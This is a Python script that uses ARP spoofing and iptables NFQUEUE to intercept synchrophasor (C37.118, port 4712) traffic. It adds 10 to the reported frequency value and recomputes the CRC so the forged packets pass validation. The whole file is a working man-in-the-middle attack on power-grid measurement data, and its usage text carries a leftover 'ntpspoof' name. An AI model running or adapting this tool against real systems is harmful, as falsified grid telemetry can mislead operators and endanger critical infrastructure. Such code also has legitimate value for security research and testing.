#!/usr/bin/python3

'''
Requirements (Debian)
sudo apt install dsniff libnetfilter-queue-dev
sudo apt install netfilterqueue 
'''

import os
import subprocess
import sys
import time
from subprocess import Popen, DEVNULL
import datetime
from scapy.all import IP, TCP, Raw, checksum, send
from netfilterqueue import NetfilterQueue
import struct
import crcmod

def modify_frequency(freq):
    modified_freq = freq + 10
    packed = struct.pack('>f', modified_freq)
    return packed
'''
def modify_c37_chksum(modified_raw, poly=0x1021, init_crc=0x0000):
    crc = init_crc
    for byte in modified_raw:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ poly
            else:
                crc <<= 1
            crc &= 0xFFFF
    print("New Checksum:", crc)
    return crc
'''
def modify_c37_chksum(data):
    crc = 0 
    for byte in data:
        crc = (crc >> 8) ^ (((crc ^ byte) & 0xff) <<8)
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc = crc << 1
            crc &= 0xffff
    return crc

def manipulate(netpackage):
    pkg = IP(netpackage.get_payload())
    tcp = pkg.getlayer(TCP)

    if TCP in pkg and pkg.haslayer(Raw):
        raw = pkg[TCP].load
        print("Old Load:", raw)
        if len(raw) > 68 and len(raw) < 90:
            #try:
            print('')
            freq = struct.unpack('>f', raw[64:68])[0]
            print("Frequency:", freq)

            new_freq = modify_frequency(freq)
            modified_raw = raw[:64] + new_freq + raw[68:]

            chk = struct.unpack('>H', modified_raw[-2:])[0]
            print("Old checksum:", chk)
            #c37_checksum = modify_c37_chksum(modified_raw[:-2])
            crc16 = crcmod.mkCrcFun(0x11021, rev=False, initCrc=0xFFFF, xorOut=0x0000)
            c37_checksum = crc16(modified_raw[:-2])
            packed_chk = struct.pack('>H', c37_checksum)
            modified_raw = modified_raw[:-2]
            modified_raw = modified_raw + packed_chk
            print("New Load:", modified_raw)
            pkg[TCP].load = modified_raw
            del pkg[IP].chksum
            del pkg[TCP].chksum
            netpackage.set_payload(bytes(pkg))
            print("Modified!")
            #except Exception as e:
                #print("Error modifying!", str(e))
    netpackage.accept()
    #time.sleep(5)


if __name__ == '__main__':
    print("running")
    if os.geteuid() != 0:
        print('You have to run the script as root')
        exit(1)

    if len(sys.argv) < 2:
        print('Usage: ntpspoof <target_ip> <net interface (Optional)>')
        print('Example: ntpspoof 192.168.2.99 eth0')
        exit(1)

    if len(sys.argv) < 3:
        print('No network interface specified. Using \'eth0\'')
        iface = 'eth0'
    else:
        iface = sys.argv[2]

    # calculate IP addresses
    ip_addr = sys.argv[1]
    router_ip = '192.168.0.102'

    print('Running ARP spoofing for target:', ip_addr,
          'using the router:', router_ip)
    p = Popen(['arpspoof', '-i', iface, '-t', router_ip, ip_addr],
              stderr=DEVNULL, stdout=DEVNULL)
    q = Popen(['arpspoof', '-i', iface, '-t', ip_addr, router_ip],
   	      stderr=DEVNULL, stdout=DEVNULL)

    # run iptables
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        print('1\n', file=f)
    os.system('iptables -t raw -A PREROUTING -p tcp -d'
		+ router_ip + ' --sport 4712 -j NFQUEUE --queue-num 99')

    #os.system('iptables -t mangle -A POSTROUTING -p tcp --sport 4712 -j CHECKSUM --checksum-fill')

    nfqueue = NetfilterQueue()
    # 99 is the iptabels rule queue number, modify is the callback function
    nfqueue.bind(99, manipulate)
    try:
        print("[*] waiting for TCP packages")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfqueue.unbind()
        p.terminate()
        os.system('iptables -F -vt raw')

